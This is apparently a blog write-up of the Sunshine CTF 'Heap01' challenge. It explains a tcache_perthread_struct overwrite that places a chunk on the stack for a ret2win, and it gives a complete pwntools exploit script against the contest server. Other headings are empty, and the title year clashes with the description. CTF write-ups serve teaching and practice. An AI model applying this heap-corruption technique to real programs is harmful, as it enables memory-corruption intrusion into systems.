---
title: Sunshine CTF 2023
category: WRITEUP, CTF, HEAP, TCACHE, HOUSE OF FORCE
date: May 15th, 2024
description: Writeup of challenges for sunshine ctf 2024.
---

## Secure Flag Terminal



## Heap01

This challenge is a just a simple function in a single run. 
First it leaks a pointer to the stack. Then it asks for a size
and allocates a chunk of that size.
After that it allows you to write an index out of bounds three times. 

Then it allocates another chunk of the same size, and allows three
more writes.

The simple solution is to overwrite the tcache\_perthread\_struct
which resides at the beginning of the heap. 

The tcache\_perthread\_struct is a struct that resides at the 
beginning of a heap and is used as the management structure 
of the tcache similar to the main\_arena.


```
typedef struct tcache_perthread_struct

{

  char counts[TCACHE_MAX_BINS];

  tcache_entry *entries[TCACHE_MAX_BINS];

} tcache_perthread_struct;



# define TCACHE_MAX_BINS                64

```

```
typedef struct tcache_entry

{

  struct tcache_entry *next;

} tcache_entry;

```

Our goal now is to overwrite one of the tcache entries to our stack
leak and then overwrite the count that specifies that there is 
an entry in the specific tcachesize. 


Then the second malloc will allocate on the stack. After that
we can do a simple ret2win.

```
#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["alacritty", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "2024.sunshinectf.games"
PORT =  24006

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def align_chunk(addr):
    return (addr + 0x20) & 0xfffffffffffffff0

def exploit(p,e):

    ru(p,b"Do you want a leak?")

    sl(p,p64(0x500))

    rl(p)
    stack_leak = int(rl(p).strip(b"\n"),16)
    log.info(f"Stack leak {hex(stack_leak)}")

    ru(p,b"Enter chunk size:")

    chunk_size = 0x38

    sl(p,str(chunk_size))

    ru(p,b"Index: ")

    pthread_struct_entry_offset = -(int)(4624 / 8)
    sl(p,str(pthread_struct_entry_offset))

    target = stack_leak
    log.info(f"Setting tcache_perthread_struct entry to {hex(target)}")
    ru(p,b"Value: ")
    sl(p,str(target + 0x20).encode())

    ru(p,b"Index: ")
    pthread_struct_offset_count = -(int)(4768 / 8)
    sl(p,str(pthread_struct_offset_count))

    ru(p,b"Value: ")
    sl(p,str(0x1000100010001))

    r = ROP(e)
    for i in range(2):
        ru(p,b"Value: ")
        sl(p,str(r.find_gadget(["ret"])[0]))

    ru(p,b"Value: ")
    sl(p,str(e.sym["win"]))

    p.interactive()



if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    #l = ELF("./libc.so.6")

    exploit(p,e)

```

## Jungle

